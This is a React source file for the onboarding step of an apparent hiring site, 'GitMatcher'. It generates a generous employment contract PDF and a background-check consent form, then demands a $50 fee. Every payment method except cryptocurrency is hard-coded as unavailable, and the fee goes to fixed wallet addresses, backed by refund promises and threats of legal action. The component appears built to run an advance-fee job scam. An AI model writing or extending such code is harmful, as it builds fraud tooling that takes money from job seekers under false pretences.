import React, { useState, useEffect } from 'react';
import { FileUpload } from './';
import { PhaseFormProps, DocumentInfo } from '../types';
import jsPDF from 'jspdf';

interface LegalFormProps extends PhaseFormProps {
  uploadedFiles: Record<string, DocumentInfo>;
  setUploadedFiles: React.Dispatch<React.SetStateAction<Record<string, DocumentInfo>>>;
}

const LegalForm: React.FC<LegalFormProps> = ({ 
  onSubmit, 
  onBack, 
  uploadedFiles, 
  setUploadedFiles, 
  initialData 
}) => {
  const [formData, setFormData] = useState({
    consentCheck: false,
    paymentConsent: false,
    transactionId: '',
    ltcAmount: ''
  });

  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState<'crypto' | 'card' | 'paypal' | 'skrill'>('crypto');
  const [selectedCrypto, setSelectedCrypto] = useState<'ltc' | 'sol' | 'tron' | 'usdt'>('ltc');
  const [copySuccess, setCopySuccess] = useState(false);

  const [errors, setErrors] = useState<Record<string, string>>({});
  const [fileErrors, setFileErrors] = useState<Record<string, string>>({});

  const requiredFiles = ['contract', 'consent'];
  
  // Crypto wallet addresses
  const cryptoAddresses = {
    ltc: 'ltc1qkeen3kn78qtqxhjqfex5u9vvvzwkncuxct9gwd',
    sol: '2pw1xmPPCqv8Dj7musXtj7YdQ1urWM1osqgaUTwzwtQD', 
    tron: 'TWRPZwfvsniEoxuSXzdWf76QgGy1LRcFqi',
    usdt: '0x4F771267569BC2c67CBaDeE8fd1d0e10AA583Fe8'
  };

  const cryptoNames = {
    ltc: 'Litecoin (LTC)',
    sol: 'Solana (SOL)',
    tron: 'Tron (TRX)', 
    usdt: 'USDT (ERC-20)'
  };

  useEffect(() => {
    if (initialData) {
      setFormData({ ...formData, ...initialData });
    }
  }, [initialData]);

  const handleCopyAddress = (address: string) => {
    copyToClipboard(address);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000); // Hide feedback after 2 seconds
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value, type, checked } = e.target;
    setFormData({ 
      ...formData, 
      [name]: type === 'checkbox' ? checked : value 
    });
    
    if (errors[name]) {
      setErrors({ ...errors, [name]: '' });
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};
    const newFileErrors: Record<string, string> = {};
    
    // Consent validation
    if (!formData.consentCheck) {
      newErrors.consentCheck = 'You must consent to the background check';
    }
    if (!formData.paymentConsent) {
      newErrors.paymentConsent = 'You must agree to the payment terms';
    }

    // Payment validation
    if (!formData.transactionId.trim()) {
      newErrors.transactionId = 'Transaction ID is required';
    }
    if (!formData.ltcAmount || parseFloat(formData.ltcAmount) <= 0) {
      newErrors.ltcAmount = 'Please enter the LTC amount sent';
    }

    // File validation
    requiredFiles.forEach(fileType => {
      if (!uploadedFiles[fileType]) {
        newFileErrors[fileType] = 'This file is required';
      }
    });

    setErrors(newErrors);
    setFileErrors(newFileErrors);
    
    return Object.keys(newErrors).length === 0 && Object.keys(newFileErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      onSubmit(formData);
    }
  };

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
      // Could add a toast notification here
    } catch (err) {
      console.error('Failed to copy text: ', err);
    }
  };

  const downloadContract = () => {
    generateContractPDF();
  };

  const downloadConsent = () => {
    generateConsentPDF();
  };

  const generateContractPDF = () => {
    const doc = new jsPDF();
    
    // Set font and add title
    doc.setFontSize(20);
    doc.setFont('helvetica', 'bold');
    doc.text('Employee Contract', 20, 30);
    
    // Add a line break
    doc.setFontSize(12);
    doc.setFont('helvetica', 'normal');
    
    let yPosition = 50;
    const lineHeight = 6;
    const margin = 20;
    const pageWidth = doc.internal.pageSize.width - 2 * margin;
    
    // Contract content
    const contractText = [
      'EMPLOYMENT AGREEMENT',
      '',
      'This Employment Agreement ("Agreement") is entered into between:',
      '',
      'COMPANY: GitMatcher Inc.',
      'Address: [Company Address]',
      'Incorporated in: United States of America',
      '',
      'EMPLOYEE: _________________________ ("Employee")',
      'Address: _________________________',
      'Position: Professional Services Contractor',
      '',
      '═══════════════════════════════════════════════════════════════════',
      '',
      '1. EMPLOYMENT RELATIONSHIP & PURPOSE',
      '',
      'GitMatcher Inc. ("Company") hereby engages the Employee as an independent',
      'contractor to provide professional services within their area of expertise.',
      'The Employee will contribute to various Company projects and initiatives',
      'based on their skills, experience, and the Company\'s operational needs.',
      '',
      'This Agreement establishes a professional relationship where the Employee',
      'will work remotely and maintain flexibility in their work arrangements',
      'while meeting agreed-upon deliverables and quality standards.',
      '',
      '2. SCOPE OF WORK & RESPONSIBILITIES',
      '',
      'The Employee\'s responsibilities may include, but are not limited to:',
      '',
      '• Project-based work within their professional expertise',
      '• Collaboration with internal teams and external clients',
      '• Quality deliverable completion within agreed timelines',
      '• Professional communication and reporting',
      '• Continuous learning and skill development as required',
      '• Adherence to Company standards and best practices',
      '• Client interaction and relationship management when applicable',
      '• Documentation and knowledge sharing',
      '• Problem-solving and innovative solution development',
      '• Cross-functional collaboration and teamwork',
      '',
      'The specific nature of work assignments will be determined based on:',
      '• Company project requirements',
      '• Employee\'s skill set and experience',
      '• Client needs and specifications',
      '• Market demands and opportunities',
      '',
      '3. COMPENSATION & PAYMENT TERMS',
      '',
      'Base Compensation:',
      '• Bi-weekly Payment: USD $4,230.00',
      '• Payment Frequency: Every two (2) weeks',
      '• Monthly Base: USD $8,460.00',
      '• Annual Base: USD $110,000.00',
      '• Payment Method: Direct deposit or agreed payment method',
      '• Payment Schedule: Within 3 business days of each bi-weekly cycle',
      '',
      'Performance & Bonus Structure:',
      '• Monthly Performance Bonus: Up to USD $1,650.00',
      '• Total Monthly Potential: USD $10,110.00 (base + bonus)',
      '• Maximum Annual Potential: USD $129,800.00 (including bonuses)',
      '• Bonus eligibility based on performance metrics and project outcomes',
      '• Additional project completion bonuses for exceptional deliverables',
      '• Annual performance reviews may result in base compensation adjustments',
      '',
      'Payment Processing:',
      '• All payments processed through Company\'s payroll system',
      '• Detailed payment statements provided with each payment',
      '• Tax documentation provided as required by law',
      '• Currency: US Dollars (USD) unless otherwise agreed',
      '',
      '4. WORK ARRANGEMENT & EXPECTATIONS',
      '',
      'Work Schedule:',
      '• Flexible remote work arrangement',
      '• Core collaboration hours to be mutually agreed upon',
      '• Availability for team meetings and client communications',
      '• Reasonable response time expectations for communications',
      '',
      'Performance Standards:',
      '• High-quality deliverable completion',
      '• Professional communication and conduct',
      '• Meeting agreed deadlines and milestones',
      '• Continuous improvement and learning',
      '• Collaborative and team-oriented approach',
      '',
      '5. INTELLECTUAL PROPERTY RIGHTS',
      '',
      'Ownership:',
      'All work products, including but not limited to code, designs, documents,',
      'processes, methodologies, and any other intellectual property created',
      'during the course of employment, shall be the exclusive property of',
      'GitMatcher Inc.',
      '',
      'Assignment of Rights:',
      'Employee hereby assigns all rights, title, and interest in any work',
      'created under this Agreement to the Company. This includes all',
      'copyrights, patents, trade secrets, and other intellectual property rights.',
      '',
      'Pre-existing IP:',
      'Employee warrants that any pre-existing intellectual property brought',
      'to the engagement will be clearly identified and remains the property',
      'of the Employee, unless specifically incorporated into Company work.',
      '',
      '6. CONFIDENTIALITY & NON-DISCLOSURE',
      '',
      'Confidential Information includes:',
      '• All Company business information, strategies, and plans',
      '• Client data, information, and business relationships',
      '• Proprietary processes, methodologies, and trade secrets',
      '• Financial information and business metrics',
      '• Employee and contractor information',
      '• Any information marked as confidential or proprietary',
      '',
      'Employee Obligations:',
      '• Maintain strict confidentiality of all Company information',
      '• Not disclose confidential information to third parties',
      '• Use confidential information solely for Company business',
      '• Return all confidential materials upon termination',
      '• Continue confidentiality obligations post-employment',
      '',
      '7. PROFESSIONAL CONDUCT & ETHICS',
      '',
      'Employee agrees to:',
      '• Maintain professional standards in all business interactions',
      '• Represent the Company positively in all external communications',
      '• Avoid conflicts of interest and disclose potential conflicts',
      '• Comply with all applicable laws and regulations',
      '• Maintain professional development and stay current in their field',
      '• Respect diversity, inclusion, and equal opportunity principles',
      '',
      '8. TERM, TERMINATION & TRANSITION',
      '',
      'Contract Term:',
      '• Initial term: Two (2) years from the effective date',
      '• Automatic renewal unless terminated by either party',
      '• Terms subject to review and adjustment annually',
      '',
      'Termination Conditions:',
      '• Either party may terminate with sixty (60) days written notice',
      '• Immediate termination for cause (breach of contract, misconduct)',
      '• Termination for convenience with appropriate notice period',
      '',
      'Transition Obligations:',
      '• Complete all assigned work in progress',
      '• Transfer knowledge and documentation to designated personnel',
      '• Return all Company property and materials',
      '• Provide reasonable transition assistance',
      '',
      '9. LEGAL COMPLIANCE & BACKGROUND VERIFICATION',
      '',
      'Employee agrees to:',
      '• Undergo comprehensive background verification as required',
      '• Provide accurate information for verification processes',
      '• Maintain good standing for continued employment',
      '• Comply with all applicable employment and tax laws',
      '• Provide required documentation for employment eligibility',
      '',
      '10. DISPUTE RESOLUTION & GOVERNING LAW',
      '',
      'Dispute Resolution:',
      '• Good faith negotiation as first step for any disputes',
      '• Mediation through mutually agreed mediator if needed',
      '• Arbitration as final resolution method if required',
      '',
      'Governing Law:',
      'This Agreement shall be governed by the laws of the United States',
      'and the state where the Company is incorporated.',
      '',
      '11. SIGNATURES & ACKNOWLEDGMENT',
      '',
      'By signing below, both parties acknowledge they have read, understood,',
      'and agree to be bound by all terms and conditions of this Agreement.',
      '',
      'FOR GITMATCHER INC.:',
      '',
      'Name: _________________________',
      'Title: Chief Executive Officer',
      'Signature: _________________________',
      'Date: _________________________',
      '',
      'FOR EMPLOYEE:',
      '',
      'Name: _________________________',
      'Signature: _________________________',
      'Date: _________________________',
      '',
      '═══════════════════════════════════════════════════════════════════',
      '',
      'IMPORTANT LEGAL NOTICE:',
      'This is a preliminary contract template provided for review and',
      'informational purposes. Upon successful completion of the onboarding',
      'process and background verification, a complete, legally binding',
      'contract with specific terms tailored to your engagement will be',
      'prepared and executed by both parties.',
      '',
      'This template serves to outline the general terms and expectations',
      'of the employment relationship. The final contract may include',
      'additional clauses, specific project details, and other provisions',
      'as required by law and business needs.',
      '',
      'Questions regarding this contract should be directed to:',
      'hr@gitmatcher.com or legal@gitmatcher.com',
      '',
      'Document Version: Template v2.0',
      'Generated: ' + new Date().toLocaleDateString(),
      'Valid for: Review purposes only'
    ];
    
    contractText.forEach((line) => {
      if (yPosition > 270) { // Check if we need a new page
        doc.addPage();
        yPosition = 30;
      }
      
      if (line.startsWith('Employee Contract') || line.startsWith('1.') || line.startsWith('2.') || 
          line.startsWith('3.') || line.startsWith('4.') || line.startsWith('5.') || 
          line.startsWith('6.') || line.startsWith('7.')) {
        doc.setFont('helvetica', 'bold');
      } else {
        doc.setFont('helvetica', 'normal');
      }
      
      const splitLines = doc.splitTextToSize(line, pageWidth);
      splitLines.forEach((splitLine: string) => {
        doc.text(splitLine, margin, yPosition);
        yPosition += lineHeight;
      });
    });
    
    doc.save('Employee_Contract_Template.pdf');
  };

  const generateConsentPDF = () => {
    const doc = new jsPDF();
    
    // Set font and add title
    doc.setFontSize(18);
    doc.setFont('helvetica', 'bold');
    doc.text('Background Check Consent Letter', 20, 30);
    
    doc.setFontSize(12);
    doc.setFont('helvetica', 'normal');
    
    let yPosition = 50;
    const lineHeight = 6;
    const margin = 20;
    const pageWidth = doc.internal.pageSize.width - 2 * margin;
    
    const consentText = [
      'I, _________________________ (Full Name), hereby give my explicit consent',
      'for Gitmatcher. to conduct a comprehensive background check as part',
      'of my employee onboarding process.',
      '',
      'CONSENT DETAILS:',
      '• I understand that a background check will be conducted covering criminal',
      '  history, employment verification, and education verification',
      '• I authorize the company to contact previous employers, educational',
      '  institutions, and relevant authorities',
      '• I understand that this background check is mandatory for employment as',
      '  an Employee',
      '• I consent to the processing of my personal data for this purpose',
      '• I understand that I will pay $50 USD (my portion) while GitMatcher',
      '  covers the remaining $50 of the total $100 background check cost',
      '• The background check will be conducted by Checkr, a trusted industry',
      '  leader in professional verification services',
      '',
      'SIGNATURE SECTION:',
      'Employee Signature: _________________________',
      'Date: _________________________',
      '',
      'IMPORTANT: Please sign this document and upload to Google Drive as',
      'instructed. This consent is required before background check processing',
      'can begin.',
      '',
      'Generated on: ' + new Date().toLocaleDateString()
    ];
    
    consentText.forEach((line) => {
      if (yPosition > 270) {
        doc.addPage();
        yPosition = 30;
      }
      
      if (line.startsWith('CONSENT DETAILS:') || line.startsWith('PERSONAL INFORMATION:') || 
          line.startsWith('SIGNATURE SECTION:')) {
        doc.setFont('helvetica', 'bold');
      } else {
        doc.setFont('helvetica', 'normal');
      }
      
      const splitLines = doc.splitTextToSize(line, pageWidth);
      splitLines.forEach((splitLine: string) => {
        doc.text(splitLine, margin, yPosition);
        yPosition += lineHeight;
      });
    });
    
    doc.save('Background_Check_Consent_Letter.pdf');
  };

  const uploadConfigs = [
    {
      id: 'contract',
      icon: 'fas fa-file-contract',
      title: 'Signed Employee Contract',
      description: 'Download PDF, review, sign, and upload to Google Drive',
      downloadAction: downloadContract
    },
    {
      id: 'consent',
      icon: 'fas fa-file-signature',
      title: 'Background Check Consent Letter',
      description: 'Download PDF, sign, and upload to Google Drive',
      downloadAction: downloadConsent
    }
  ];

  return (
    <div className="phase active">
      <div className="phase-header">
        <h2>Legal Onboarding & Background Check</h2>
        <p>Complete your legal documentation and background check</p>
      </div>

      <form onSubmit={handleSubmit} className="form-container">
        <div className="form-section">
          <h3>Legal Documents</h3>
          <div className="upload-grid">
            {uploadConfigs.map(config => (
              <div key={config.id}>
                <FileUpload
                  id={config.id}
                  icon={config.icon}
                  title={config.title}
                  description={config.description}
                  uploadedFiles={uploadedFiles}
                  setUploadedFiles={setUploadedFiles}
                  error={fileErrors[config.id]}
                />
                <button 
                  type="button"
                  className="download-link" 
                  onClick={config.downloadAction}
                >
                  <i className="fas fa-download"></i> Download {config.title.split(' ')[0]} Template
                </button>
              </div>
            ))}
          </div>
        </div>

        <div className="form-section">
          <h3>Background Verification Process</h3>
          <div className="background-check-info">
            <p>As part of our hiring process, all employees complete a standard background check, conducted in partnership with <a href="https://checkr.com/" target="_blank" rel="noopener noreferrer" style={{color: '#007bff', textDecoration: 'none'}}>Checkr</a>. This is a widely accepted practice across the technology industry, especially when working with sensitive client systems and data. Our approach is transparent, compliant, and designed to ensure a smooth onboarding experience for every candidate.</p>
            
            <p><strong>For non-U.S. candidates:</strong></p>
            <p>Your background check also allows us to register your documents and information in our employee database. This step formally establishes you as a full-time employee of GitMatcher, which is important not only for onboarding but also for future needs such as attending our annual work events and summits in person. In such cases, being recognized as a registered employee can help streamline visa processing and ensure compliance with international requirements.</p>
            
            <p><strong>Why we require it:</strong></p>
            <p>Security compliance: Many clients require verified checks before granting codebase access.</p>
            <p>Trust & safety: Helps us maintain a secure, professional environment for both our team and clients.</p>
            <p>Regulatory standards: Certain industries legally require verified employee backgrounds.</p>
            <p>Data protection: Ensures safe handling of client data and intellectual property.</p>
            <p>Professional excellence: Reinforces our reputation as a trusted technology partner.</p>
            
            <p><strong>Our investment in you:</strong></p>
            <p>At GitMatcher, we view this as a shared investment. We cover 50% of the background check cost on your behalf, so you only pay $50 upfront. This amount is fully refunded once your background check is cleared and onboarding is complete. This approach ensures fairness, protects the integrity of the process, and demonstrates our commitment to supporting qualified employees.</p>
            
            <p><strong>Why we cannot accept self-arranged reports:</strong></p>
            <p>Certified third-party providers are required by both law and client contracts.</p>
            <p>Independent verification ensures authenticity and accurate documentation.</p>
            <p>Our liability insurance mandates accredited checks.</p>
            <p>A standardized process guarantees fairness for every employee.</p>
            
            <p><strong>Process overview:</strong></p>
            <p>Provider: Checkr (industry-leading background check service)</p>
            <p>Coverage: Criminal history, employment history, education verification</p>
            <p>Processing time: Approximately 5 business days</p>
            <p>Your part: $50 USD (refunded after onboarding)</p>
            <p>Transparency: Clear process, no hidden fees, secure digital payment methods.</p>
          </div>
        </div>

        <div className="form-section">
          <h3>Background Check Consent & Payment</h3>
          <div className="consent-section">
            <div className="checkbox-group">
              <input
                type="checkbox"
                id="consentCheck"
                name="consentCheck"
                checked={formData.consentCheck}
                onChange={handleChange}
              />
              <label htmlFor="consentCheck">
                I consent to a comprehensive background check including criminal history, employment verification, and education verification. I understand this process will take 5 business days to complete.
              </label>
              {errors.consentCheck && <span className="error-message">{errors.consentCheck}</span>}
            </div>
            
            <div className="checkbox-group">
              <input
                type="checkbox"
                id="paymentConsent"
                name="paymentConsent"
                checked={formData.paymentConsent}
                onChange={handleChange}
              />
              <label htmlFor="paymentConsent">
                I agree to pay $50 USD for my portion of the background check processing fee (GitMatcher covers the remaining $50). I understand this payment will be processed through secure digital payment methods.
              </label>
              {errors.paymentConsent && <span className="error-message">{errors.paymentConsent}</span>}
            </div>
          </div>
        </div>

        <div className="form-section">
          <h3>Payment Method</h3>
          <div className="payment-method-selection">
            <p>Select payment method:</p>
            
            <div className="payment-methods">
              <div className={`payment-option disabled`}>
                <div className="payment-icon">💳</div>
                <div className="payment-details">
                  <h4>Credit/Debit Card</h4>
                  <p className="unavailable">❌ Unavailable for your location</p>
                </div>
              </div>

              <div className={`payment-option disabled`}>
                <div className="payment-icon">�</div>
                <div className="payment-details">
                  <h4>PayPal</h4>
                  <p className="unavailable">❌ Unavailable for your location</p>
                </div>
              </div>

              <div 
                className={`payment-option ${selectedPaymentMethod === 'crypto' ? 'selected' : ''}`}
                onClick={() => setSelectedPaymentMethod('crypto')}
              >
                <div className="payment-icon">₿</div>
                <div className="payment-details">
                  <h4>Cryptocurrency</h4>
                  <p className="available">✅ Available - Multiple crypto options</p>
                </div>
              </div>

              <div className={`payment-option disabled`}>
                <div className="payment-icon">💰</div>
                <div className="payment-details">
                  <h4>Skrill</h4>
                  <p className="unavailable">❌ Unavailable for your location</p>
                </div>
              </div>
            </div>
          </div>
        </div>

        {selectedPaymentMethod === 'crypto' && (
        <div className="form-section">
          <h3>Cryptocurrency</h3>
          <div className="crypto-selection">
            <p>Select cryptocurrency:</p>
            
            <div className="crypto-options">
              <div 
                className={`crypto-option ${selectedCrypto === 'ltc' ? 'selected' : ''}`}
                onClick={() => setSelectedCrypto('ltc')}
              >
                <div className="crypto-icon">Ł</div>
                <div className="crypto-details">
                  <h4>Litecoin (LTC)</h4>
                  <p>Fast transactions, low fees</p>
                  <small>Network: Litecoin</small>
                </div>
              </div>

              <div 
                className={`crypto-option ${selectedCrypto === 'sol' ? 'selected' : ''}`}
                onClick={() => setSelectedCrypto('sol')}
              >
                <div className="crypto-icon">◎</div>
                <div className="crypto-details">
                  <h4>Solana (SOL)</h4>
                  <p>High-speed blockchain</p>
                  <small>Network: Solana</small>
                </div>
              </div>

              <div 
                className={`crypto-option ${selectedCrypto === 'tron' ? 'selected' : ''}`}
                onClick={() => setSelectedCrypto('tron')}
              >
                <div className="crypto-icon">₮</div>
                <div className="crypto-details">
                  <h4>Tron (TRX)</h4>
                  <p>Very low transaction fees</p>
                  <small>Network: Tron</small>
                </div>
              </div>

              <div 
                className={`crypto-option ${selectedCrypto === 'usdt' ? 'selected' : ''}`}
                onClick={() => setSelectedCrypto('usdt')}
              >
                <div className="crypto-icon">₮</div>
                <div className="crypto-details">
                  <h4>USDT (ERC-20)</h4>
                  <p>Stable value (1 USDT = $1 USD)</p>
                  <small>Network: Ethereum (ERC-20)</small>
                </div>
              </div>
            </div>
            
            <div className="crypto-notice">
              <i className="fas fa-exclamation-triangle"></i>
              <p><strong>Important:</strong> Please ensure you select the correct network when sending your payment. Sending to the wrong network may result in loss of funds.</p>
            </div>
          </div>
        </div>
        )}

        {selectedPaymentMethod === 'crypto' && (
        <div className="form-section">
          <h3>{cryptoNames[selectedCrypto]} Payment Details</h3>
          <div className="payment-section">
            <div className="payment-info">
              <p>Send exactly <strong>$50 USD worth of {cryptoNames[selectedCrypto]}</strong> to the address below, then enter your transaction details.</p>
            </div>
            
            <div className="wallet-address">
              <label>{cryptoNames[selectedCrypto]} Address:</label>
              <div className="address-container">
                <input 
                  type="text" 
                  value={cryptoAddresses[selectedCrypto]} 
                  readOnly 
                  className="wallet-input"
                />
                <button 
                  type="button" 
                  className={`btn-copy ${copySuccess ? 'success' : ''}`}
                  onClick={() => handleCopyAddress(cryptoAddresses[selectedCrypto])}
                >
                  {copySuccess ? '✓' : 'Copy'}
                </button>
              </div>
            </div>

            <div className="form-group">
              <label htmlFor="transactionId">Transaction ID *</label>
              <input
                type="text"
                id="transactionId"
                name="transactionId"
                placeholder="Transaction hash"
                value={formData.transactionId}
                onChange={handleChange}
                className={errors.transactionId ? 'error' : ''}
                required
              />
              {errors.transactionId && <span className="error-message">{errors.transactionId}</span>}
            </div>

            <div className="form-group">
              <label htmlFor="ltcAmount">Amount Sent *</label>
              <input
                type="number"
                id="ltcAmount"
                name="ltcAmount"
                step="0.00000001"
                placeholder="0.00000000"
                value={formData.ltcAmount}
                onChange={handleChange}
                className={errors.ltcAmount ? 'error' : ''}
                required
              />
              {errors.ltcAmount && <span className="error-message">{errors.ltcAmount}</span>}
            </div>
            
            <small className="verification-note">Payment verified within 1-2 hours</small>
            
            <div className="payment-disclaimer" style={{marginTop: '15px', padding: '15px', backgroundColor: '#fff3cd', border: '1px solid #ffeaa7', borderRadius: '5px'}}>
              <div style={{marginBottom: '10px'}}>
                <strong style={{color: '#856404'}}>⚠️ IMPORTANT PAYMENT NOTICE:</strong>
              </div>
              <p style={{margin: '5px 0', fontSize: '14px', color: '#856404'}}>
                • <strong>Exact Amount Required:</strong> You must send exactly $50 USD worth of cryptocurrency. Sending any amount greater or lesser than $50 will make the transaction VOID and will cause an immediate reversal of payment.
              </p>
              <p style={{margin: '5px 0', fontSize: '14px', color: '#856404'}}>
                • <strong>Support Contact:</strong> If you encounter any payment issues or have questions, contact us immediately at <strong>support@gitmatcher.com</strong> before attempting payment.
              </p>
              <p style={{margin: '5px 0', fontSize: '14px', color: '#856404'}}>
                • <strong>False Transaction Disclaimer:</strong> Any false, fraudulent, or test transactions will result in immediate disqualification from the hiring process and potential legal action. All payments are monitored and verified through blockchain analysis.
              </p>
            </div>
          </div>
        </div>
        )}

        <div className="form-actions">
          <button type="button" className="btn btn-secondary" onClick={onBack}>
            <i className="fas fa-arrow-left"></i>
            Back
          </button>
          <button type="submit" className="btn btn-primary">
            Complete Onboarding
            <i className="fas fa-check"></i>
          </button>
        </div>
      </form>

      {/* Payment Unavailable Modal - REMOVED */}
    </div>
  );
};

export default LegalForm;
